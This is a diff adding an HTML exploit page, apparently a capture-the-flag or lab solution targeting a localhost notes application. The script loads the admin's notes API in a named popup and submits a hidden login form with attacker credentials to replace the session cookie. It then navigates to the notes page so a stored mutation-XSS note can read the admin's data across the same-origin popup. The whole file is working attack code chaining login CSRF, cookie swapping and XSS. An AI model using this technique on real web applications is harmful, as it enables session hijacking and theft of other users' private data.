@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <script>
+        // Step 1: Open admin's notes API in a named popup (GET = SameSite Lax sends cookies)
+        var adminPopup = window.open('http://localhost/api/notes', 'adminData');
+
+        // Step 2: After admin data loads, login as our user via form POST in another popup
+        // This replaces the connect.sid cookie for localhost domain
+        setTimeout(function () {
+            // Create hidden popup for login
+            var loginWin = window.open('about:blank', 'loginWin');
+
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://localhost/api/auth/login';
+            form.target = 'loginWin';
+
+            var u = document.createElement('input');
+            u.type = 'hidden'; u.name = 'username'; u.value = 'exploituser1';
+            form.appendChild(u);
+
+            var p = document.createElement('input');
+            p.type = 'hidden'; p.name = 'password'; p.value = 'exploitpass1';
+            form.appendChild(p);
+
+            document.body.appendChild(form);
+            form.submit();
+
+            // Step 3: After login cookie is set, navigate main window to notes page
+            // Our XSS note will fire via mXSS, and read adminPopup (same origin)
+            setTimeout(function () {
+                window.location = 'http://localhost/';
+            }, 2000);
+        }, 3000);
+    </script>
+</body>
+
+</html>
